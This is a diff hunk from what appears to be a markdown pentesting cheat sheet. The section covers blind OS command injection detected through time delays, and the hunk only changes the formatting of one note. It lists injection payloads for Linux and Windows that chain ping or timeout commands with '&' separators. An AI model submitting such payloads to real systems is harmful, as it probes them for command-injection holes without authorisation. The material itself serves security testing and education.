@@ -95,7 +95,7 @@
 
 ### Blind OS Command Injection with Time Delays
 
-* `& ping -c 10 127.0.0.1 &` (try using different separators) <sup><sub>(Linux)<sub></sup>
+* `& ping -c 10 127.0.0.1 &` <sup><sub>(try using different separators<sub></sup> <sup><sub> </sup><sup><sub>- Linux)<sub></sup>
 * `& ping -n 10 127.0.0.1 &` <sup><sub>(Windows - uses<sub></sup> <sup><sub> </sup><sup><sub>`-n`<sub></sup> <sup><sub> </sup><sup><sub>instead of<sub></sup> <sup><sub> </sup><sup><sub>`-c`<sub></sup><sup><sub>)<sub></sup>
 * `& timeout /t 10 &` <sup><sub>(Windows alternative - direct sleep, no ICMP needed)<sub></sup>
 * Triggers a time delay to send 10 ICMP packets
